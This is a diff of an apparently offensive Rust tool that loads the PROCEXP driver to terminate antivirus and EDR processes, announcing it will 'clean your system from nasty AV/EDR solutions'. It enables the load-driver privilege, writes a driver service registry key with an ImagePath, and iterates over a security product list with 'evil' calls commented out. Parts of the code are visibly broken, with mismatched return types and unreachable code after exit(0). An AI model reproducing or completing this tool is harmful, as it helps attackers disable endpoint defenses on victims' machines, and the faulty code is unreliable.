@@ -115,46 +115,6 @@ fn enable_loaddriver_privilege() -> bool {
                 println!("{}", message);
             }
         }
-        /*
-        let ntstatus = NtOpenProcessToken(
-            GetCurrentProcess(),
-            TOKEN_ADJUST_PRIVILEGES,
-            htoken
-        );
-        match ntstatus {
-            0 => {
-                let message = format!("[+] Successfully used NtOpenProcessToken");
-                println!("{}", message);
-            }
-            _ => {
-                let message = format!(
-                    "[-] NtOpenProcessToken call failed.. NTSTATUS: {}",
-                    ntstatus
-                );
-                println!("{}", message);
-            }
-        }
-
-        let ntstatus = syscall!(
-            "NtOpenProcessToken",
-            GetCurrentProcess(),
-            TOKEN_ADJUST_PRIVILEGES,
-            htoken
-        );
-        match ntstatus {
-            0 => {
-                let message = format!("[+] Successfully used NtOpenProcessToken");
-                println!("{}", message);
-            }
-            _ => {
-                let message = format!(
-                    "[-] NtOpenProcessToken call failed.. NTSTATUS: {}",
-                    ntstatus
-                );
-                println!("{}", message);
-            }
-        }
-        */
 
         let ntstatus = AdjustTokenPrivileges(
             htoken as HANDLE,
@@ -202,26 +162,28 @@ fn create_registry_key(
     drivername: &CStr,
     nt_driver_path: &[CHAR; MAX_PATH], path_length: DWORD
 ) -> Result<(), Box<dyn std::error::Error>> {
-    //TODO : take the regitry key func from KLoad project, winreg does not work.
-    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let path = Path::new("SYSTEM")
-        .join("CurrentControlSet")
-        .join("Services")
-        .join(&drivername);
+    unsafe {
+        let mut key_handle: HKEY = std::mem::zeroed();
+        let subkey = format!("SYSTEM\\CurrentControlSet\\Services\\{}", drivername.to_str()?);
 
-    let (key1, _) = hkcu.create_subkey(&path)?;
-    let value: u32 = 1;
-    key1.set_value("Type", &value)?;
+        // Create a key in the under the current machine control set services
+        if RegCreateKeyA(HKEY_LOCAL_MACHINE, subkey.as_str().as_ptr() as *const i8, &key_handle as *const HKEY as*mut HKEY) != 0 {
+                return Err(GetLastError());
+        }
 
-    let (key2, _) = hkcu.create_subkey(&path)?;
-    key2.set_value("ErrorControl", &value)?;
+        // Create an image path string value 
+        let image_path = CString::new("ImagePath");
+        if RegSetValueExA(key_handle, image_path?.as_ptr(), 0, REG_SZ, nt_driver_path.as_ptr() as *const u8, path_length) != 0 {
+                return GetLastError();
+        }
 
-    let (key3, _) = hkcu.create_subkey(&path)?;
-    key3.set_value("Start", &value)?;
-
-    let driverpath = driverpath.to_str().unwrap();
-    let (key4, _) = hkcu.create_subkey(&path)?;
-    key4.set_value("ImagePath", &driverpath)?;
+        // Create a new type DWORD value
+        let type_name = CString::new("Type");
+        let type_data: DWORD = 1;
+        if RegSetValueExA(key_handle, type_name?.as_ptr(), 0, REG_DWORD, &type_data as *const DWORD as *mut u8, std::mem::size_of_val(&type_data) as u32) != 0 {
+                return GetLastError();
+        }
+    }
 
     Ok(())
 }
@@ -302,9 +264,12 @@ fn main() {
     let mut nt_driver_path: [CHAR; MAX_PATH] = [0; MAX_PATH];
     let mut nt_driver_path_cstring = CString::new("PROCEXP").unwrap().as_c_str();
 
-    //TODO : get result of get_nt_path
-    match get_nt_path(nt_driver_path_cstring, &mut nt_driver_path) 
-    let res_create_reg = create_registry_key(DRIVERNAME.to_string(), nt_driver_path_cstring.clone());
+    let buffer_length = match get_nt_path(nt_driver_path_cstring, &mut nt_driver_path_cstring) {
+        Ok(value) => value,
+        Err(e) => panic!(
+            "[-] Error while getting NT path: {}", e),
+    };
+    let res_create_reg = create_registry_key(&CString::new(*DRIVERNAME).unwrap(), &nt_driver_path_cstring, buffer_length);
     match res_create_reg {
         Ok(()) => println!("[+] Successfully wrote {} registry keys", DRIVERNAME),
         Err(e) => panic!(
@@ -338,18 +303,15 @@ fn main() {
 
     exit(0);
 
-
     if args.len() == 2 {
         println!(
             "[+] Executing tool in custom target mode. Targeting {} process",
             &args[1]
         );
         let target = &args[1];
-        //evil(target);
     } else {
         println!("[+] Starting. Attempting to clean your system from nasty AV/EDR solutions..");
         for target in product_list {
-            //evil(target);
         }
     }
 }
